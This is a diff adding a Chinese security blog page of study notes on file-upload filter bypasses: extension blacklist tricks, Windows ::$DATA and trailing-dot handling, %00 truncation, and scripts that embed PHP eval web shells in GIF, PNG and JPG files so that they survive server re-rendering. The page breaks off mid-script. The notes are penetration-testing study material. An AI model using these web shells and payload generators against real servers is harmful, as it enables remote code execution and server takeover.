@@ -1,0 +1,701 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/blogs/img/goodnight.png">
+  <link rel="icon" href="/blogs/img/goodnight.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="首先进行fuzz测试 上传拦截绕过条件竞争 上传拦截绕过1. 黑名单黑白名单判断：	传递一个不存在的后缀，如果能上传说明是黑名单如果是黑名单，可以遍历可利用的后缀字典，看看有没有漏掉过滤的。  windows下 大小写绕过 空格、点、::$DATA 绕过  windows保存文件的时候会自动去掉文件末尾多余的.和空格和::$DATA  1file_put_contents(&#x27;a.php:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传">
+<meta property="og:url" content="http://mekrina.github.io/blogs/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
+<meta property="og:site_name" content="mekrina">
+<meta property="og:description" content="首先进行fuzz测试 上传拦截绕过条件竞争 上传拦截绕过1. 黑名单黑白名单判断：	传递一个不存在的后缀，如果能上传说明是黑名单如果是黑名单，可以遍历可利用的后缀字典，看看有没有漏掉过滤的。  windows下 大小写绕过 空格、点、::$DATA 绕过  windows保存文件的时候会自动去掉文件末尾多余的.和空格和::$DATA  1file_put_contents(&#x27;a.php:">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-01-20T13:06:41.000Z">
+<meta property="article:modified_time" content="2025-05-30T01:24:18.382Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>文件上传 - mekrina</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/blogs/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/blogs/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/blogs/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"mekrina.github.io","root":"/blogs/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/blogs/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/blogs/js/utils.js" ></script>
+  <script  src="/blogs/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/blogs/">
+      <strong>home</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/blogs/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/blogs/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/blogs/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/blogs/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/blogs/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/blogs/img/%E9%9B%AA%E5%B1%B1%E6%98%9F%E7%A9%BA.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="文件上传"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-01-20 21:06" pubdate>
+          2025年1月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">文件上传</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>首先进行fuzz测试</p>
+<p><a href="#%E4%B8%8A%E4%BC%A0%E6%8B%A6%E6%88%AA%E7%BB%95%E8%BF%87">上传拦截绕过</a><br><a href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89">条件竞争</a></p>
+<h2 id="上传拦截绕过"><a href="#上传拦截绕过" class="headerlink" title="上传拦截绕过"></a>上传拦截绕过</h2><h3 id="1-黑名单"><a href="#1-黑名单" class="headerlink" title="1. 黑名单"></a>1. 黑名单</h3><p><strong>黑白名单判断：</strong><br>	传递一个不存在的后缀，如果能上传说明是黑名单<br>如果是黑名单，可以遍历可利用的后缀字典，看看有没有漏掉过滤的。</p>
+<ul>
+<li>windows下<ul>
+<li>大小写绕过</li>
+<li>空格、点、<code>::$DATA</code> 绕过<br>  windows保存文件的时候会自动去掉文件末尾多余的<code>.</code>和<code>空格</code>和<code>::$DATA</code>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;a.php::$DATA&#x27;</span>, <span class="hljs-string">&quot;hello world&quot;</span>);<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>%00截断 <code>php-version&lt;5.3.4</code></li>
+<li>phphpp绕过</li>
+<li>制作图片马, 可绕过exif_imagetype(), getimagesize()</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy smi1e.jpg /b + shell.php /a shell.jpg<br></code></pre></td></tr></table></figure>
+<ul>
+<li><p>imagecreatefrom???(二次渲染)<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/2337">学习文章</a></p>
+<ul>
+<li><p>gif<br>  只需要找到渲染前后没有变化的部分,插入一句话木马即可</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://3wapp.github.io/Image/png.html">png</a></p>
+<ul>
+<li>写入PLTE并修改CRC<br>  <strong>payload</strong>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// made by mekrina 2025/3/9</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&#x27;&lt;?=@eval($_POST[1]);?&gt;&#x27;</span>;<br><span class="hljs-keyword">while</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>) % <span class="hljs-number">3</span> != <span class="hljs-number">0</span>)&#123;<br>	<span class="hljs-variable">$payload</span> .= <span class="hljs-string">&#x27;0&#x27;</span>; <span class="hljs-comment">// rgb三通道</span><br>&#125;<br><span class="hljs-variable">$width</span> = <span class="hljs-number">1</span>;<br><span class="hljs-variable">$height</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>) / <span class="hljs-number">3</span>; <span class="hljs-comment">// 像素数目</span><br><span class="hljs-variable">$image</span> = <span class="hljs-title function_ invoke__">imagecreate</span>(<span class="hljs-variable">$width</span>, <span class="hljs-variable">$height</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$index</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$index</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$index</span>+=<span class="hljs-number">3</span>)&#123;<br>	<span class="hljs-variable">$color_index</span> = [<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$payload</span>[<span class="hljs-variable">$index</span>]), <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$payload</span>[<span class="hljs-variable">$index</span>+<span class="hljs-number">1</span>]), <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$payload</span>[<span class="hljs-variable">$index</span>+<span class="hljs-number">2</span>])];<br>	<span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$image</span>, <span class="hljs-variable">$color_index</span>[<span class="hljs-number">0</span>], <span class="hljs-variable">$color_index</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$color_index</span>[<span class="hljs-number">2</span>]);<br>	<span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$image</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$index</span>/<span class="hljs-number">3</span>, <span class="hljs-variable">$color</span>);<br>&#125;;<br><span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$image</span>, <span class="hljs-string">&#x27;1.png&#x27;</span>);<br><span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$image</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;索引彩色PNG图片已生成：1.png&quot;</span>;<br></code></pre></td></tr></table></figure></li>
+<li>写入IDAT数据块<br>  写入结果</li>
+</ul>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>  脚本</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>		<span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>		<span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>		<span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>		<span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>		<span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>		<span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>		<span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><br><br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br><span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br><span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br><span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br><span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$img</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li>
+<li><p>jpg<br>  先随便拿一个正常jpg文件经过php二次渲染</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-string">&quot;normal.jpg&quot;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$im</span>);<br><span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$im</span>, <span class="hljs-string">&#x27;php_fit_normal.jpg&#x27;</span>);<br></code></pre></td></tr></table></figure>
+<p>  然后使用<code>php exp.php php_fit_normal.jpg</code>生成payload.jpg<br>  <strong>payload</strong></p>
+</li>
+</ul>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="hljs-comment">   It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   1) Upload an arbitrary image via secured files upload script</span><br><span class="hljs-comment">   2) Save the processed image and launch:</span><br><span class="hljs-comment">   jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="hljs-comment">   1) After the second processing the injected data may become partially corrupted.</span><br><span class="hljs-comment">   2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class="hljs-comment">   If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   Sergey Bobrov <span class="hljs-doctag">@Black</span>2Fan.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   See also:</span><br><span class="hljs-comment">   https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   */</span><br><br>   <span class="hljs-variable">$miniPayload</span> = <span class="hljs-string">&quot;&lt;?=@eval(<span class="hljs-subst">$_POST</span>[1]);?&gt;&quot;</span>;<br><br><br>   <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;gd&#x27;</span>) || !<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php-gd is not installed&#x27;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>])) &#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);<br>   &#125;<br><br>   <span class="hljs-title function_ invoke__">set_error_handler</span>(<span class="hljs-string">&quot;custom_error_handler&quot;</span>);<br><br>   <span class="hljs-keyword">for</span>(<span class="hljs-variable">$pad</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$pad</span> &lt; <span class="hljs-number">1024</span>; <span class="hljs-variable">$pad</span>++) &#123;<br>       <span class="hljs-variable">$nullbytePayloadSize</span> = <span class="hljs-variable">$pad</span>;<br>       <span class="hljs-variable">$dis</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>       <span class="hljs-variable">$outStream</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>       <span class="hljs-variable">$extraBytes</span> = <span class="hljs-number">0</span>;<br>       <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br><br>       <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readShort</span>() != <span class="hljs-number">0xFFD8</span>) &#123;<br>           <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Incorrect SOI marker&#x27;</span>);<br>       &#125;<br><br>       <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>()) &amp;&amp; (<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>() == <span class="hljs-number">0xFF</span>)) &#123;<br>           <span class="hljs-variable">$marker</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>();<br>           <span class="hljs-variable">$size</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readShort</span>() - <span class="hljs-number">2</span>;<br>           <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">skip</span>(<span class="hljs-variable">$size</span>);<br>           <span class="hljs-keyword">if</span>(<span class="hljs-variable">$marker</span> === <span class="hljs-number">0xDA</span>) &#123;<br>               <span class="hljs-variable">$startPos</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">seek</span>();<br>               <span class="hljs-variable">$outStreamTmp</span> = <br>                   <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                   <span class="hljs-variable">$miniPayload</span> . <br>                   <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>) . <br>                   <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>);<br>               <span class="hljs-title function_ invoke__">checkImage</span>(<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStreamTmp</span>, <span class="hljs-literal">TRUE</span>);<br>               <span class="hljs-keyword">if</span>(<span class="hljs-variable">$extraBytes</span> !== <span class="hljs-number">0</span>) &#123;<br>                   <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>())) &#123;<br>                       <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>() === <span class="hljs-number">0xFF</span>) &#123;<br>                           <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte !== <span class="hljs-number">0x00</span>) &#123;<br>                               <span class="hljs-keyword">break</span>;<br>                           &#125;<br>                       &#125;<br>                   &#125;<br>                   <span class="hljs-variable">$stopPos</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">seek</span>() - <span class="hljs-number">2</span>;<br>                   <span class="hljs-variable">$imageStreamSize</span> = <span class="hljs-variable">$stopPos</span> - <span class="hljs-variable">$startPos</span>;<br>                   <span class="hljs-variable">$outStream</span> = <br>                       <span class="hljs-title function_ 